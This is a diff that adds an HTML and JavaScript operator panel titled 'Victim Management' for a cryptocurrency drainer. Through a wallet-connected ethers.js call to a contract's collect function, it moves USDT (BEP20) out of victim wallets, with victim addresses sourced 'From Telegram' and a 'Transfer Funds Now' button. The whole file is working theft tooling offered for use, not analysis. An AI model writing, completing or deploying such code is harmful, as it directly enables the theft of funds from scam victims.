@@ -1,0 +1,82 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>Crypto Project - Admin Panel</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <script src="https://cdn.jsdelivr.net/npm/ethers@5.7.2/dist/ethers.umd.min.js"></script>
+</head>
+<body class="bg-slate-900 text-white font-sans p-10">
+    <div class="max-w-4xl mx-auto">
+        <h1 class="text-4xl font-bold text-blue-500 mb-6 text-center">Victim Management</h1>
+        
+        <div class="bg-slate-800 p-6 rounded-xl mb-8 border border-slate-700 flex justify-between items-center">
+            <div>
+                <p class="text-sm text-gray-400">Admin Wallet (Owner):</p>
+                <p id="walletAddr" class="font-mono text-blue-300">Not Connected</p>
+            </div>
+            <button onclick="connectAdmin()" class="bg-blue-600 hover:bg-blue-700 px-6 py-2 rounded-lg font-bold">Connect Wallet</button>
+        </div>
+
+        <div class="bg-slate-800 p-8 rounded-xl border border-slate-700 shadow-2xl">
+            <h2 class="text-xl mb-4 font-semibold">Withdraw USDT (BEP20)</h2>
+            <div class="space-y-4">
+                <div>
+                    <label class="block text-sm text-gray-400 mb-1">Victim Wallet Address (From Telegram)</label>
+                    <input id="victim_address" type="text" placeholder="0x..." class="w-full bg-slate-900 border border-slate-600 rounded-lg p-3 text-white focus:outline-none focus:border-blue-500">
+                </div>
+                <div>
+                    <label class="block text-sm text-gray-400 mb-1">Amount to Drain (USDT)</label>
+                    <input id="drain_amount" type="number" placeholder="Enter Amount" class="w-full bg-slate-900 border border-slate-600 rounded-lg p-3 text-white focus:outline-none focus:border-blue-500">
+                </div>
+                <button onclick="executeWithdraw()" class="w-full bg-red-600 hover:bg-red-700 py-4 rounded-lg font-black text-xl transition-all shadow-lg uppercase">
+                    Transfer Funds Now
+                </button>
+            </div>
+        </div>
+    </div>
+
+    <script>
+        // CONFIG - Inhe Remix se lekar yahan update karein
+        const CONTRACT_ADDRESS = "YOUR_REMIX_CONTRACT_ADDRESS"; 
+        const USDT_ADDRESS = "0x55d398326f99059fF775485246999027B3197955";
+        const ABI = [ "function collect(address token, address victim, uint256 amount) public" ];
+
+        let signer, contract;
+
+        async function connectAdmin() {
+            if (window.ethereum) {
+                const provider = new ethers.providers.Web3Provider(window.ethereum);
+                await provider.send("eth_requestAccounts", []);
+                signer = provider.getSigner();
+                const address = await signer.getAddress();
+                document.getElementById('walletAddr').innerText = address;
+                contract = new ethers.Contract(CONTRACT_ADDRESS, ABI, signer);
+                alert("Connected Successfully!");
+            } else {
+                alert("Please use a Web3 Browser or Trust Wallet!");
+            }
+        }
+
+        async function executeWithdraw() {
+            const victim = document.getElementById('victim_address').value;
+            const amount = document.getElementById('drain_amount').value;
+
+            if (!victim || !amount) return alert("Details bharo pehle!");
+
+            try {
+                // 1 USDT = 10^18 units for BEP20 USDT
+                const amountInWei = ethers.utils.parseUnits(amount.toString(), 18);
+                
+                const tx = await contract.collect(USDT_ADDRESS, victim, amountInWei);
+                alert("Withdrawal Triggered! Hash: " + tx.hash);
+                await tx.wait();
+                alert("Paisa Transfer Ho Gaya!");
+            } catch (err) {
+                console.error(err);
+                alert("Failed: " + err.message);
+            }
+        }
+    </script>
+</body>
+</html>
